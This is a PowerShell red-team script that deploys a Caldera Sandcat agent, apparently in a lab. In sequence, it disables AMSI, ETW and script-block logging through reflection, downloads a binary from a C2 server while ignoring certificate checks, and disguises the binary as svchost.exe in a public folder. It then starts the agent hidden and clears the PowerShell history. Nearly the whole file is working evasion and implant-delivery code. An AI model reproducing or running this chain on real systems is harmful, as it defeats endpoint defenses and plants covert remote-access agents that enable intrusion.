# ================================================================
# Sandcat Stealth Deployment - AMSI Bypass Edition
# Anti-Defender deployment with multiple evasion techniques
# ================================================================

# Disable error logging
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ================================================================
# AMSI BYPASS - Method 1: Memory Patching
# ================================================================
function Disable-AMSI {
    try {
        $a = [Ref].Assembly.GetTypes()
        foreach ($b in $a) {
            if ($b.Name -like "*iUtils") {
                $c = $b.GetFields('NonPublic,Static')
                foreach ($d in $c) {
                    if ($d.Name -like "*Context") {
                        $d.SetValue($null, [IntPtr]::Zero)
                        return $true
                    }
                }
            }
        }
    } catch {}
    return $false
}

# ================================================================
# ETW BYPASS - Disable Event Tracing for Windows
# ================================================================
function Disable-ETW {
    try {
        $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($etw) {
            $field = $etw.GetField('etwProvider','NonPublic,Static')
            if ($field) {
                $field.SetValue($null, 0)
                return $true
            }
        }
    } catch {}
    return $false
}

# ================================================================
# Logging Bypass - Disable PowerShell script logging
# ================================================================
function Disable-PSLogging {
    try {
        $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        $cachedGroupPolicySettings = $settings.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if ($cachedGroupPolicySettings) {
            $groupPolicySettings = $cachedGroupPolicySettings.GetValue($null)
            $groupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
            $groupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
            return $true
        }
    } catch {}
    return $false
}

# ================================================================
# Main Deployment
# ================================================================

Write-Host "[" -NoNewline
Write-Host "*" -ForegroundColor Cyan -NoNewline
Write-Host "] Sandcat Stealth Deployment Starting..."

# Apply bypasses
$amsi = Disable-AMSI
$etw = Disable-ETW
$log = Disable-PSLogging

if ($amsi) {
    Write-Host "[" -NoNewline
    Write-Host "+" -ForegroundColor Green -NoNewline
    Write-Host "] AMSI Disabled"
} else {
    Write-Host "[" -NoNewline
    Write-Host "!" -ForegroundColor Yellow -NoNewline
    Write-Host "] AMSI bypass failed (might still work)"
}

if ($etw) {
    Write-Host "[" -NoNewline
    Write-Host "+" -ForegroundColor Green -NoNewline
    Write-Host "] ETW Disabled"
}

if ($log) {
    Write-Host "[" -NoNewline
    Write-Host "+" -ForegroundColor Green -NoNewline
    Write-Host "] Script logging disabled"
}

# ================================================================
# Download Sandcat Agent
# ================================================================

# Server configuration
$server = "http://192.168.124.133:8888"
$url = "$server/file/download"

# Deployment paths
$deployPath = "C:\Users\Public\svchost.exe"
$altPath = "$env:APPDATA\Microsoft\Windows\svchost.exe"

Write-Host "[" -NoNewline
Write-Host "*" -ForegroundColor Cyan -NoNewline
Write-Host "] Target: $deployPath"

# Terminate existing processes
Write-Host "[" -NoNewline
Write-Host "*" -ForegroundColor Cyan -NoNewline
Write-Host "] Checking for existing instances..."

try {
    Get-Process | Where-Object { $_.Path -like "*svchost.exe" -and $_.Path -notlike "*System32*" } | Stop-Process -Force
    Write-Host "[" -NoNewline
    Write-Host "+" -ForegroundColor Green -NoNewline
    Write-Host "] Killed existing instances"
} catch {
    Write-Host "[" -NoNewline
    Write-Host "!" -ForegroundColor Yellow -NoNewline
    Write-Host "] No existing instances"
}

# Remove old files
if (Test-Path $deployPath) {
    Remove-Item -Force $deployPath -ErrorAction SilentlyContinue
}

# ================================================================
# Download agent with custom headers
# ================================================================

Write-Host "[" -NoNewline
Write-Host "*" -ForegroundColor Cyan -NoNewline
Write-Host "] Downloading Sandcat agent..."

try {
    # Use TLS 1.2 for HTTPS
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    
    # Ignore self-signed SSL certificates
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    
    # WebClient with headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("platform", "windows")
    $wc.Headers.Add("file", "sandcat.go")
    $wc.Headers.Add("architecture", "amd64")
    
    # Download payload
    $data = $wc.DownloadData($url)
    
    if ($data.Length -gt 0) {
        # Write binary
        [System.IO.File]::WriteAllBytes($deployPath, $data)
        
        $sizeMB = [math]::Round($data.Length / 1MB, 2)
        Write-Host "[" -NoNewline
        Write-Host "+" -ForegroundColor Green -NoNewline
        Write-Host "] Downloaded $sizeMB MB"
    } else {
        throw "Empty payload"
    }
    
} catch {
    Write-Host "[" -NoNewline
    Write-Host "X" -ForegroundColor Red -NoNewline
    Write-Host "] Download failed: $($_.Exception.Message)"
    
    Write-Host "[" -NoNewline
    Write-Host "*" -ForegroundColor Cyan -NoNewline
    Write-Host "] Trying alternate path: $altPath"
    
    $deployPath = $altPath
}

# ================================================================
# Verify downloaded binary
# ================================================================

if (-not (Test-Path $deployPath)) {
    Write-Host "[" -NoNewline
    Write-Host "X" -ForegroundColor Red -NoNewline
    Write-Host "] Binary not found at $deployPath"
    exit 1
}

$fileSize = (Get-Item $deployPath).Length
if ($fileSize -lt 1000) {
    Write-Host "[" -NoNewline
    Write-Host "X" -ForegroundColor Red -NoNewline
    Write-Host "] Binary too small ($fileSize bytes) - invalid download"
    Remove-Item $deployPath -Force
    exit 1
}

Write-Host "[" -NoNewline
Write-Host "+" -ForegroundColor Green -NoNewline
Write-Host "] Binary verified ($fileSize bytes)"

# ================================================================
# Execute agent in background
# ================================================================

Write-Host "[" -NoNewline
Write-Host "*" -ForegroundColor Cyan -NoNewline
Write-Host "] Starting agent in background..."

try {
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $deployPath
    $processInfo.Arguments = "-server $server -group red"
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    $processInfo.UseShellExecute = $false
    
    $process = [System.Diagnostics.Process]::Start($processInfo)
    
    if ($process) {
        Start-Sleep -Seconds 2
        
        if (-not $process.HasExited) {
            Write-Host "[" -NoNewline
            Write-Host "+" -ForegroundColor Green -NoNewline
            Write-Host "] Agent started successfully (PID: $($process.Id))"
            
            Write-Host ""
            Write-Host "===============================================" -ForegroundColor Cyan
            Write-Host "[" -NoNewline
            Write-Host "+" -ForegroundColor Green -NoNewline
            Write-Host "] Deployment Complete!" -ForegroundColor Green
            Write-Host "===============================================" -ForegroundColor Cyan
            Write-Host ""
            Write-Host "Process Name : " -NoNewline
            Write-Host "svchost.exe" -ForegroundColor Yellow
            Write-Host "Process ID   : " -NoNewline
            Write-Host "$($process.Id)" -ForegroundColor Yellow
            Write-Host "Binary Path  : " -NoNewline
            Write-Host "$deployPath" -ForegroundColor Yellow
            Write-Host "C2 Server    : " -NoNewline
            Write-Host "$server" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "Check Caldera UI for agent beacon..." -ForegroundColor Cyan
            
        } else {
            Write-Host "[" -NoNewline
            Write-Host "X" -ForegroundColor Red -NoNewline
            Write-Host "] Agent exited immediately - check permissions or AV"
        }
    }
    
} catch {
    Write-Host "[" -NoNewline
    Write-Host "X" -ForegroundColor Red -NoNewline
    Write-Host "] Failed to start agent: $($_.Exception.Message)"
    exit 1
}

# ================================================================
# Cleanup
# ================================================================

# Clean PowerShell history
Clear-History

Write-Host ""
Write-Host "Tip: Monitor agent with: " -NoNewline -ForegroundColor Yellow
Write-Host "Get-Process svchost | Where-Object {`$_.Path -like '*Public*'}" -ForegroundColor Cyan
